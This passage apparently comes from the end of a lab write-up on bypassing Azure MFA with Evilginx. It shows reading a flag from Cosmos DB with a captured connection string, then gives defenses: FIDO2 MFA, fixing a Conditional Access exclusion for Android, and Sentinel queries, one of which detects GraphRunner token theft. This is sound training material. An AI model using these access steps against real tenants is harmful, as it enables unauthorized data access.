AccountKey=<REDACTED>;TableEndpoint=https://project-oakley-43632.table.cosmos.azure.com:443/;
```

Accessing CosmosDB data residing in Tables may be somewhat limited if requested from Applications, from CLIs, and even from development tools such as VSCode. However, the Azure native CosmosDB interface, https://cosmos.azure.com/, can be used instead. After navigating to the page, click the link that says `Connect to your account with connection string.`

![](bypass-azure-mfa-with-evilginx-13.png)

Inputting the connection string above returns the table below that contains a list of IP addresses and the flag

![](bypass-azure-mfa-with-evilginx-14.png)



# Attack path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](bypass-azure-mfa-with-evilginx-15.png)


# Defense

It is recommended to provide user awareness training on phishing. User alertness to phishing threats gradually decreases after each awareness session, and "catching" users out with simulated phishing isn't a great way to get them to promote the security cause, but a good user awareness program still has benefits.

It is also recommended to use modern, phishing resistent MFA that support FIDO2 (Fast Identity Online) authentication. Once you register your phishing resistent MFA to a service, it's bound that specific (legitimate) URL, and the registered credential can't be used to login to a fake website. After logging in, websites that support phishing resistent MFA ask you to plug in and make contact with the MFA key, allowing you to prove the "something you have" factor of authentication. Threat actors don't have your physical key, and wouldn't be able to satisfy this step and wouldn't get any cookies either. Time-based one-time password (TOTP) based MFA (as used in this lab) is less secure, as although it implies the "something you have" factor of authentication, threat actors can also have it!

MFA enablement gaps can be present, even in seemingly strict policies. In this case, Edrian Taylor were required to authenticate every time with multiple factors against all cloud apps, from all clients, and from all devices apart from Android mobile devices.

![](bypass-azure-mfa-with-evilginx-16.png)

We see in the policy that not only is Android not included as a target device platform, but it's also specifically excluded.

![](bypass-azure-mfa-with-evilginx-17.png)

Under the `Include` section, it's recommended to select `Any device` instead of manually selecting device platforms. If `Any device` is selected, even in the case that Azure Conditional Access evaluation isn't able to determine the device platform, it would still be subject to policy enforcement. If `Any device` isn't selected, an unrecognized device could bypass policy enforcement.

As seen in the Azure sign-in logs, when user inputs the correct password and MFA code, it isn't flagged as suspicious.

![](bypass-azure-mfa-with-evilginx-18.png)

It's worth understanding what "normal" looks like in our environment, and alerting on spikes in managed identity activity that deviate from this normal behaviour.

![](bypass-azure-mfa-with-evilginx-19.png)

We can also use Sentinel to report on the most active managed identities, which may reveal suspicious behavior.
```
AADManagedIdentitySignInLogs
| where TimeGenerated > ago(7d)
| summarize CountPerManagedIdentity = count() by ServicePrincipalId
| order by CountPerManagedIdentity desc
| take 100
```
We can detect GraphRunner's `Get-GraphTokens` invocations that use the default device code authentication method. It's worth noting that this query wouldn't catch `Get-GraphTokens` invocations that have the `-UserPasswordAuth` parameter specified.
```
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where ResourceDisplayName == "Microsoft Graph"
```